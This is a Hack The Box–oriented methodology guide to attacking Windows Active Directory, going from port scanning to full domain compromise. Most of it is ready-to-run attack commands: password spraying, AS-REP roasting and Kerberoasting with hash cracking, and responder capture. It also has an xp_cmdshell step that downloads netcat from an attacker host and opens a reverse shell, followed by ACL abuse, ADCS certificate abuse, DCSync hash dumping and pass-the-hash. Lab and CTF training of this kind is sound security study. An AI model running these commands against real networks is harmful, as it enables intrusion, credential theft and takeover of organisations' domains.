# Windows Active Directory Hacking Guide for HTB

A practical methodology guide from initial scan to domain compromise.

---

## Phase 1: Reconnaissance

### Initial Nmap Scan

```bash
# Quick scan - all ports
nmap -p- --min-rate=1000 -T4 <IP> -oN ports.txt

# Detailed scan on discovered ports
nmap -p<ports> -sC -sV <IP> -oN scan.txt
```

### Key Ports to Identify

| Port      | Service        | Significance                            |
| --------- | -------------- | --------------------------------------- |
| 53        | DNS            | Domain controller indicator             |
| 80/443    | HTTP/S         | Web apps, employee names, info leakage  |
| 88        | Kerberos       | AD authentication, Kerberoasting target |
| 135       | RPC            | Windows RPC enumeration                 |
| 139/445   | SMB            | File shares, credential hunting         |
| 389/636   | LDAP           | Directory enumeration                   |
| 1433      | MSSQL          | Database access, command execution      |
| 3268/3269 | Global Catalog | AD forest queries                       |
| 5985/5986 | WinRM          | PowerShell remote access                |

### Extract Domain Info from Nmap

Look for:

- Domain name: `Domain: DOMAIN.LOCAL`
- Hostname: `name:DC01`
- DNS names in certificates

```bash
# Add to /etc/hosts
echo "<IP> domain.local dc01.domain.local" | sudo tee -a /etc/hosts
```

---

## Phase 2: Service Enumeration

### SMB Enumeration (Port 445)

```bash
# Check null/anonymous access
netexec smb <IP> -u '' -p '' --shares
netexec smb <IP> -u 'guest' -p '' --shares

# With credentials
netexec smb <IP> -u 'user' -p 'pass' --shares
netexec smb <IP> -u 'user' -p 'pass' --users
netexec smb <IP> -u 'user' -p 'pass' --groups

# List shares
smbclient -L //<IP> -U 'user%pass'

# Connect to share
smbclient //<IP>/ShareName -U 'user%pass'

# Spider shares for files
netexec smb <IP> -u 'user' -p 'pass' -M spider_plus

# Map share permissions
smbmap -H <IP> -u 'user' -p 'pass'
```

### LDAP Enumeration (Port 389)

```bash
# Anonymous bind
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"

# With credentials
ldapsearch -x -H ldap://<IP> -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local"

# Get users
ldapsearch -x -H ldap://<IP> -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Get password policy
ldapsearch -x -H ldap://<IP> -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local" "(objectClass=domain)" | grep -i pwd
```

### HTTP Enumeration (Port 80/443)

```bash
# Directory brute force
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

# Look for:
# - Employee names (About, Team, Contact pages)
# - Login portals
# - Version info
# - Comments in source code
```

### MSSQL Enumeration (Port 1433)

```bash
# Test connection
nc -zv <IP> 1433

# With credentials (Windows auth)
impacket-mssqlclient domain/user:'password'@<IP> -windows-auth

# SQL local auth (no -windows-auth flag)
impacket-mssqlclient sa:'password'@<IP>

# Useful SQL commands
enum_db
enum_users
enum_logins
enum_impersonate
enable_xp_cmdshell
xp_cmdshell whoami
xp_cmdshell dir C:\
```

---

## Phase 3: Initial Access Techniques

### Technique 1: AS-REP Roasting (No Creds Required)

Works against accounts with "Do not require Kerberos preauthentication" enabled.

```bash
# Need username list first
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <IP> -format hashcat -outputfile asrep.hashes

# Crack the hash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### Technique 2: Kerberoasting (Creds Required)

Target service accounts with SPNs.

```bash
# Get TGS tickets
impacket-GetUserSPNs domain.local/user:'password' -dc-ip <IP> -request -outputfile kerberoast.hashes

# Crack
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

### Technique 3: Password Spraying

```bash
# Spray one password against many users
netexec smb <IP> -u users.txt -p 'Password123' --continue-on-success

# Check WinRM access
netexec winrm <IP> -u users.txt -p 'Password123'

# Check MSSQL
netexec mssql <IP> -u users.txt -p 'Password123'
```

### Technique 4: Credential Files

Common locations:

- SMB shares (xlsx, docx, txt, config files)
- Web directories
- SQL Server installation folders (`C:\SQL2019\`)
- SYSVOL (Group Policy Preferences)

```bash
# Extract xlsx files (they're ZIP archives)
unzip -d extracted/ file.xlsx
cat extracted/xl/sharedStrings.xml

# Search for passwords in files
grep -ri 'password' .
strings file.xlsx | grep -iE 'pass|pwd|user'
```

### Technique 5: NTLM Hash Capture

```bash
# Start responder
sudo responder -I tun0

# Trigger auth via SQL
xp_dirtree \\<YOUR_IP>\share

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## Phase 4: Getting a Shell

### WinRM (Port 5985) - Preferred

```bash
# Verify access
netexec winrm <IP> -u 'user' -p 'password'

# Get shell
evil-winrm -i <IP> -u 'user' -p 'password'

# With hash (Pass-the-Hash)
evil-winrm -i <IP> -u 'Administrator' -H <NT-hash>
```

### MSSQL Command Execution

```bash
# Connect as sa or privileged user
impacket-mssqlclient sa:'password'@<IP>

# Enable xp_cmdshell
enable_xp_cmdshell

# Execute commands
xp_cmdshell whoami
xp_cmdshell dir C:\Users

# Get reverse shell
xp_cmdshell certutil -urlcache -f http://<YOUR_IP>/nc64.exe C:\Users\Public\nc64.exe
xp_cmdshell C:\Users\Public\nc64.exe -e cmd.exe <YOUR_IP> 4444
```

### PSExec / SMBExec

```bash
# Requires admin creds
impacket-psexec domain/admin:'password'@<IP>
impacket-smbexec domain/admin:'password'@<IP>
impacket-wmiexec domain/admin:'password'@<IP>
```

---

## Phase 5: Post-Exploitation Enumeration

### Basic Windows Commands

```powershell
# Current user
whoami
whoami /all
whoami /priv

# System info
hostname
systeminfo
ipconfig /all

# Users
net user
net user <username>
net localgroup Administrators

# Domain info
net user /domain
net group /domain
net group "Domain Admins" /domain
```

### File System Exploration

```powershell
# List directory (including hidden)
dir -Force C:\Users\

# Read files
type C:\Users\user\Desktop\user.txt
Get-Content file.txt

# Search for files
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.ini,*.config -ErrorAction SilentlyContinue

# Find password files
Get-ChildItem -Path C:\ -Recurse -Filter "*password*" -ErrorAction SilentlyContinue
```

### Useful Commands for Post-Exploitation Enumeration on Windows (SYSTEM Shell)

#### 1. Basic System Recon
Get context about the box quickly.

```cmd
whoami                  # Confirms your user (should be nt authority\system)
whoami /priv            # Lists your privileges (SeDebugPrivilege, SeImpersonate, etc. – all enabled at SYSTEM)
whoami /groups          # Shows group membership

hostname                # Machine name
systeminfo              # Full OS version, patches, uptime, domain/workgroup – great for context
systeminfo | findstr /i "OS Domain Hotfix"   # Filtered version

ver                     # Windows version shorthand
echo %USERNAME%         # Current user
echo %USERDOMAIN%
```

#### 2. User & Account Enumeration
Look for other users, passwords in files, or interesting accounts.

```cmd
net user                # List all local users
net user administrator  # Details on admin account
net localgroup          # List groups
net localgroup administrators   # Who is admin (you should see Administrator and maybe others)

dir C:\Users            # List user profiles (same as your earlier SMB view)
dir "C:\Users\*" /s /b | findstr /i desktop   # Find all Desktop folders
```

#### 3. Network Enumeration
See connections, interfaces, routing.

```cmd
ipconfig /all           # IP, DNS, gateway
route print             # Routing table
arp -a                  # ARP cache

netstat -ano            # Active connections + listening ports + PID
netstat -ano | findstr LISTENING   # Just listening ports
netstat -ano | findstr ESTABLISHED # Active connections
```

#### 4. Process & Service Enumeration
Spot suspicious processes or services.

```cmd
tasklist /v             # Processes with usernames
tasklist /svc           # Processes and services they host

wmic process list full  # More detailed process info
wmic service list brief # List services

sc query                # Service status
net start               # Running services
```

#### 5. File System Search & Flag Hunting (Most Important Here)
This is a CTF-style box → flags are almost certainly `user.txt` and `root.txt` on desktops.

```cmd
# Quick flag search across all drives
dir C:\user.txt /s /p
dir C:\root.txt /s /p
dir C:\*.txt /s /b | findstr /i "user root flag proof"

# Targeted: Check common locations directly (fastest)
cd C:\Users\Administrator\Desktop
dir
type user.txt
type root.txt

cd C:\Users\Public\Desktop
dir
type *.txt

cd C:\Users\Default\Desktop
dir

# Broader recursive search from C:\
tree /f C:\Users | findstr /i "txt"
dir /s /b C:\Users\*.txt
```

#### 6. Misc Useful Commands
```cmd
reg query HKLM\SOFTWARE    # Registry browsing (e.g., for installed software)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"  # Autoruns

qwinsta                 # Logged-on users (RDP sessions)
```

#### Tips for This Shell
- Impacket psexec shells support extra commands: type `!help` to see them (e.g., `!dir`, `!whoami` for better output).
- Navigation is standard: `cd`, `dir`, `type`, `findstr`.
- If you need to upload tools later (e.g., winPEAS, PowerUp), you can use `upload <localfile> <remotepath>` in the shell.
- Since you're SYSTEM, everything is readable – no access denied errors.

Start with `whoami`, then jump straight to the Desktop checks under `C:\Users\Administrator\Desktop` – that's where `root.txt` is almost guaranteed to be on easy boxes like this. Then hunt for `user.txt` if it's separate.


### BloodHound Collection

```bash
# From Kali (remote)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns <DC_IP> -c All --zip

# Or upload SharpHound to target
upload SharpHound.exe
.\SharpHound.exe -c All
download <timestamp>_BloodHound.zip
```

### Analyze BloodHound Data (CLI)

```bash
# Pretty print
cat *_users.json | jq '.' > users_pretty.json

# Find specific user
cat users_pretty.json | jq '.data[] | select(.Properties.name | test("USERNAME"; "i"))'

# Find ACEs on target
cat users_pretty.json | jq '.data[] | select(.Properties.name | test("TARGET"; "i")) | .Aces'

# Look for dangerous permissions
rg -i 'writeowner|writedacl|genericall|genericwrite' *.json
```

---

## Phase 6: Privilege Escalation

### Windows Privilege Checks

```powershell
# Check privileges
whoami /priv

# Interesting privileges:
# - SeImpersonatePrivilege → Potato attacks
# - SeBackupPrivilege → Read any file
# - SeRestorePrivilege → Write any file
# - SeDebugPrivilege → Debug processes
```

### Common AD Escalation Paths

#### Path 1: ACL Abuse (WriteOwner, WriteDACL, GenericAll)

```powershell
# Upload PowerView
upload PowerView.ps1
Import-Module .\PowerView.ps1

# Take ownership
Set-DomainObjectOwner -Identity "target" -OwnerIdentity "attacker"

# Grant rights
Add-DomainObjectAcl -TargetIdentity "target" -Rights ResetPassword -PrincipalIdentity "attacker"

# Reset password
$cred = ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force
Set-DomainUserPassword -Identity "target" -AccountPassword $cred
```

#### Path 2: ADCS Exploitation (ESC1-ESC8)

```bash
# Enumerate ADCS
certipy-ad find -u user@domain.local -p 'password' -dc-ip <IP> -stdout

# ESC4: Modify template
certipy-ad template -u user@domain.local -p 'password' -template VulnTemplate -dc-ip <IP> -write-default-configuration

# Request cert as admin
certipy-ad req -u user@domain.local -p 'password' -ca CA-NAME -template VulnTemplate -upn administrator@domain.local -dc-ip <IP>

# Get hash from cert
certipy-ad auth -pfx administrator.pfx -domain domain.local -dc-ip <IP>
```

#### Path 3: DCSync (Domain Admin or Replication Rights)

```bash
# Dump all hashes
impacket-secretsdump domain/admin:'password'@<DC_IP>

# Dump specific user
impacket-secretsdump -just-dc-user Administrator domain/admin:'password'@<DC_IP>
```

#### Path 4: Credential Hunting

```powershell
# Registry autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Cached credentials
cmdkey /list

# PowerShell history
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Saved credentials
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\
```

---

## Phase 7: Domain Compromise

### Pass-the-Hash

```bash
# WinRM
evil-winrm -i <IP> -u Administrator -H <NT-hash>

# PSExec
impacket-psexec -hashes :<NT-hash> domain/Administrator@<IP>

# SMB
netexec smb <IP> -u Administrator -H <NT-hash>
```

### Get Domain Admin Hash

```bash
# Once DA, dump DC hashes
impacket-secretsdump domain/admin:'password'@<DC_IP>

# Or with hash
impacket-secretsdump -hashes :<NT-hash> domain/admin@<DC_IP>
```

### Get Flags

```powershell
# User flag
type C:\Users\<user>\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

---

## Quick Reference: Username Formats

Generate username wordlists from employee names:

| Name       | Possible Usernames                        |
| ---------- | ----------------------------------------- |
| John Smith | jsmith, john.smith, smithj, john, j.smith |
| Jane Doe   | jdoe, jane.doe, doej, jane, j.doe         |

```bash
# Generate variations
cat names.txt | while read first last; do
  f=$(echo $first | cut -c1 | tr '[:upper:]' '[:lower:]')
  first_lower=$(echo $first | tr '[:upper:]' '[:lower:]')
  last_lower=$(echo $last | tr '[:upper:]' '[:lower:]')
  echo "${f}${last_lower}"
  echo "${first_lower}.${last_lower}"
  echo "${first_lower}${last_lower:0:1}"
  echo "${first_lower}"
done > usernames.txt
```

---

## Attack Flow Summary

```
1. NMAP SCAN
      ↓
2. ENUMERATE SERVICES
   - HTTP → Employee names
   - SMB → Shares, files
   - LDAP → Users, groups
      ↓
3. GET CREDENTIALS
   - AS-REP Roasting (no creds)
   - File hunting (xlsx, config)
   - Password spray
   - Kerberoasting (with creds)
      ↓
4. GET SHELL
   - WinRM (evil-winrm)
   - MSSQL (xp_cmdshell)
   - PSExec/WMIExec
      ↓
5. ENUMERATE AD
   - BloodHound
   - PowerView
   - Manual enumeration
      ↓
6. PRIVILEGE ESCALATION
   - ACL abuse
   - ADCS exploitation
   - Credential hunting
   - Token impersonation
      ↓
7. DOMAIN COMPROMISE
   - DCSync
   - Pass-the-Hash
   - Get flags
```

---

## Essential Tools

| Tool              | Purpose                     |
| ----------------- | --------------------------- |
| nmap              | Port scanning               |
| netexec (nxc)     | SMB/WinRM/MSSQL enumeration |
| smbclient/smbmap  | SMB interaction             |
| ldapsearch        | LDAP queries                |
| impacket-*        | Windows protocol tools      |
| evil-winrm        | WinRM shell                 |
| bloodhound-python | AD collection               |
| certipy-ad        | ADCS exploitation           |
| hashcat           | Password cracking           |
| PowerView.ps1     | AD enumeration (on target)  |

---

## Common Mistakes to Avoid

1. **Using wrong auth type for MSSQL**
    
    - Domain account: `-windows-auth`
    - SQL account (sa): no flag
2. **Forgetting /etc/hosts**
    
    - Kerberos requires proper DNS resolution
3. **Not checking WinRM first**
    
    - If 5985 is open and you have creds, try WinRM before anything else
4. **Ignoring clock skew**
    
    - Kerberos requires time sync within 5 minutes
    - Check nmap output for clock skew
5. **Truncating hashes**
    
    - NT hash is always 32 characters
    - Format: `LM:NT` → use the NT part (after colon)
6. **Box resets**
    
    - HTB boxes reset periodically
    - Work fast after making changes (password resets, ACL modifications)
